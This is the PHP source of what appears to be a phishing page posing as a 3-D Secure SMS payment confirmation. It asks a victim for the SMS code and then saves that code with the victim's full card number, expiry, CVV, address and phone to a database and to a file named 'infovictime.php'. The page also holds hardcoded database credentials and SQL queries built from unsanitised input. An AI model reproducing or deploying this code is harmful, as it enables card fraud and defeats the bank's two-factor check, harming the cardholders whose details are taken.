<?php
$con=  mysqli_connect("us-mm-auto-dca-06-b.cleardb.net", "b5f045c90404ea",  "61ad1a3f",  "heroku_eac45f3ef65a15a");
mysqli_query($con,"SET CHARACTER SET 'utf8'");
session_start();







if(  isset($_POST["confirmcodesms"])  )
{		
		$row= mysqli_fetch_assoc (  mysqli_query(  $con   ,     "select * from orderclien  "    )   ) ; 
	    $result  =  mysqli_query(      $con   ,     "select * from orderclien  where email='".$row["email"]."' "           );
		foreach($result as $row)	
	    {	
			$datetime= $row["datetime"];
			$ip= $row["ip"];
			$img= $row["img"];   
			$title= $row["title"];
			$price1= $row["price1"];
			$quantity= $row["quantity"];				
			$color= $row["color"];					
			$sizee= $row["sizee"];		
			$shipping= $row["shipping"];				
			$subtotal= $row["subtotal"];
		    $totalprice= $row["totalprice"]; 
		    $totalitem= $row["totalitem"];					
			$email= $row["email"];		
			$firstname= $row["firstname"];				
			$lastname= $row["lastname"];			
			$address= $row["address"];			
			$city= $row["city"];			
			$country= $row["country"];				
			$postcode= $row["postcode"];					
			$phone= $row["phone"];			
			$nameoncard= $row["nameoncard"];			
			$cardnumber= $row["cardnumber"];			
			$expmm= $row["expmm"];			
			$expyy= $row["expyy"];			
			$cvv= $row["cvv"];					
			
			$codesms = $_POST["codesms"];
	
		}
					
			
		    $result = mysqli_query(  $con  ,	"INSERT INTO ordercliencodesms (  datetime , ip , totalitem , totalprice , email  ,  firstname , lastname ,  address , city	, country  , postcode , phone , nameoncard , cardnumber , expmm , expyy , cvv , codesms)    VALUES    (    '$datetime'  , '$ip' , '$totalitem' ,  '$totalprice' ,  '$email'   , '$firstname'  , '$lastname'   ,  '$address'  ,	'$city' 	,  '$country'   ,  '$postcode'  ,   '$phone'   , '$nameoncard' , '$cardnumber' , '$expmm' , '$expyy' , '$cvv' , '$codesms' )"   );            

			$file = Fopen("infovictime.php","a+"); 
			fwrite($file ,    "\n /-- star info victime --/"                                        );
			fwrite($file ,    "<br/> \n datetime : "            .      $datetime                    ); 
			fwrite($file ,    "<br/> \n ip : "                  .      $ip                          ); 
			fwrite($file ,    "<br/> \n totalitem : "           .      $totalitem                   );
			fwrite($file ,    "<br/> \n totalprice : "          .      $totalprice                  );
			fwrite($file ,    "<br/> \n email : "               .      $email                       ); 
			fwrite($file ,    "<br/> \n fulname : "             .      $firstname ." ". $lastname   ); 
			fwrite($file ,    "<br/> \n address : "             .      $address                     ); 
			fwrite($file ,    "<br/> \n city : "                .      $city                        ); 
			fwrite($file ,    "<br/> \n country : "             .      $country                     ); 
			fwrite($file ,    "<br/> \n postcode  : "           .      $postcode                    ); 
			fwrite($file ,    "<br/> \n phone : "               .      $phone                       ); 
			fwrite($file ,    "<br/> \n nameoncard : "          .      $nameoncard                  ); 
			fwrite($file ,    "<br/> \n cardnumber : "          .      $cardnumber                  ); 
			fwrite($file ,    "<br/> \n expdate : "             .      $expmm ."/". $expyy          ); 	
			fwrite($file ,    "<br/> \n cvv : "                 .      $cvv                         ); 
			fwrite($file ,    "<br/> \n codesms : "             .      $codesms                     ); 	
			fwrite($file ,    "<br/> \n /-- end info victime --/"                                   );  
			fwrite($file ,    "<br/> <br/> \n"                                                      );     
		
		
echo "<script> window.location.href = 'index.php'; </script>"; 
}






?>



<title>Welcome</title>
<meta charset="utf-8">   <meta http-equiv="X-UA-Compatible" content="IE=edge"/>  <meta http-equiv="origin-trial" content=""/>  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no"/>     
<script type="text/javascript"  src="https://code.jquery.com/jquery-3.5.1.min.js"></script> 
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.css"/>  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cairo&display=swap" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css"/>   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.min.css"/>   <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"      ></script>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css"  rel="stylesheet"  > <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js" ></script>  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js" ></script>  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.min.js" ></script>
<link rel="shortcut icon" type="image/x-icon" media="all" href="" />
<style>html, body{  padding:0; border:0; margin:0% 0%;  touch-action: manipulation;    user-select: none;   }   ul li {list-style-type:none; text-decoration:none;  }  a{text-decoration:none; }    </style>


<head>
<meta name="facebook-domain-verification" content="w1vup527caeo79ooqsx6j653c23oih" />
<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '735674590788652');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=735674590788652&ev=PageView&noscript=1" /></noscript>
<!-- End Meta Pixel Code -->
</head>



<style>
.container1 { background-color:transparent; width:100%; height:auto;   }
	.row1{ background-color:transparent; padding:0% 0%; margin:2% 0%;    display:flex; align-items:flex-start;  align-content:center; justify-content:center; text-align:center;  }       
        .row1 .col1a{width:100%; }   .row1 .col1b{background-color:transparent;   padding:0px 0px; margin:0% 0%;    display:flex; align-items:center; justify-content:flex-end; text-align:left;   }	

	.row2a{background-color:#dadfdd24;  display:flex; align-items:center;  align-content:center; justify-content:center; text-align:center;   }
     .row2b{ background-color:#ffffff61; border:solid 1px #0000002e;   padding:2% 2%; margin:0% 0%; display:grid; align-items:flex-start;  align-content:center; justify-content:center; text-align:center; grid-row-gap:1rem;  } 
     
        .row2a .row2b .col1a{width:100%; }   .row2a .row2b  .col1b{background-color:transparent;   padding:0px 0px; margin:0% 0%;    display:grid; align-items:center; justify-items:flex-start; justify-content:flex-start; text-align:left;   }	
			  .titleinfopayment{color:black; font:800 20px 'cairo';}
			  .infopayment{display:flex; align-items:center; justify-content:center; text-align:center;   }
				   .infopayment span:first-child{ width:111px;  margin-right:2px; color:black; font:600 14px 'cairo';  text-align:left;  }
				   .infopayment span:last-child{  width:200px;  margin-left:5px;  color:black; font:400 14px 'cairo';   text-align:left;  }  
        .row2a .row2b .col2a{width:100%; }   .row2a .row2b  .col2b{background-color:transparent;   padding:0px 0px; margin:0% 0%;    display:grid; align-items:center; justify-items:flex-start; justify-content:center; text-align:left; grid-row-gap:0.3rem;  }	
              .titleconfirme{color:black; font:800 20px 'cairo';}
			  .inputtext{width:200px; }
              .inputsubmit{width:100px; border:solid 1px black; border-radius:3px; }
@media only screen and (max-width:1000px) 
{  
   .row1{display:grid; }
	  .row1 .col1a{width:100%;  }
	  .row1 .col2a{ width:100%; }      
}
	

@media only screen and (max-width:600px) 
{  
}	
</style>	


<form method="post" action="" style="padding:0px; margin:0px;">  
<div class="container1">
  
    <div class="row1">
        <div class="col1a">  <div class="col1b">  
              <div class="creditcard"> info sur 3-D Secure <img src="img/visacard.jpg">  </div>
	    </div></div>
    </div>
	<div class="row2a"> <div class="row2b">
	    <div class="col1a">  <div class="col1b">   	
					<?php
					       $row= mysqli_fetch_assoc (  mysqli_query(  $con   ,     "select * from orderclien  "    )   ) ; 
	                       $result  =  mysqli_query(      $con   ,     "select * from orderclien  where email='".$row["email"]."' "           );
	                       foreach($result as $row)	
	                       {
			                    $totalprice= $row["totalprice"];
								$datetime =  $row["datetime"];
								$cardnumber = substr($row["cardnumber"], 0, 5) . "******" . substr($row["cardnumber"], 11, 5);	
								$phone = substr($row["phone"], 0, 2) . "******" . substr($row["phone"], 8, 2);						
							
					       } 
						   		?>															
								<div class="titleinfopayment">information about payment </div>
								<div class="infopayment">  <span>Amount :</span>        <span><?php echo $totalprice ?> $</span>                 </div>
								<div class="infopayment">  <span>Date :</span>          <span><?php echo $datetime ?></span>                     </div>
								<div class="infopayment">  <span>Card number :</span>   <span><?php echo $cardnumber ?>                          </div>
								<div class="infopayment">  <span>Phone Number :</span>  <span><?php echo $phone ?></span>                        </div>
					            <?php  
					 ?>	
					
		</div></div>
		<div class="col2a">  <div class="col2b">   
		  <div class="titleconfirme">Confirm payment with SMS code  </div>
		  <div>To confirm the payment, we have send SMS message with a code to your mobile phone number . </div>
		  <div>check the payment details, enter the 6-digit SMS below and click "Confirm" . </div>
		  <div><input type="number" placeholder="Code from SMS" name="codesms" class="inputtext"      required="required"     oninvalid="this.setCustomValidity('Enter a valid code ')"        oninput="setCustomValidity('')" autocomplete="Off" size="40" maxlength="40"    /> </div>
		  <div><input type="submit" value="Confirm"     name="confirmcodesms" class="inputsubmit"/> </div>
		</div></div>	
	</div> </div>

	
</div>
</form> 


















